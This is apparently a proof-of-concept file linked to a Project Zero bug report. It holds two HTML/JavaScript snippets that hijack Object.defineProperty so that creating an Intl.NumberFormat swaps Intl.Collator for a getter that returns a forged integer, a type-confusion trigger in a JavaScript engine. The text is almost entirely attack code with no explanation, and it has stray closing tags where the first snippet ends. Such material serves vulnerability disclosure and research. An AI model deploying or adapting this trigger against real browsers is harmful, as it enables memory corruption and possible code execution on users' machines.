Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=972
 
  
 
var d = Object.defineProperty;
 
var noobj = {
    get: function () {
        return 0x1234567 >> 1;
    },
    set: function () {
    }
};
 
function f(){
    var i = Intl;
    d(i, "Collator", noobj);
}
 
 
Object.defineProperty = f;
 
var q = new Intl.NumberFormat(["en"]);
 
</script></body></html>
-->
 
<html><body><script>
 
var d = Object.defineProperty;
 
var noobj = {
    get: function () {
    print("in get no");
        return 0x1234567 >> 1;
    },
    set: function () {
        print("in set no");
    }
};
 
function f(...a){
    var i = Intl;
    Intl  = {};
    d(i, "Collator", noobj);
     
}
 
var pattern = {
    get: function () {
        return f;
    },
    set: function () {
    }
};
 
Object.defineProperty(Object, "defineProperty", pattern);
 
var q = new Intl.NumberFormat(["en"]);
 
</script></body></html>

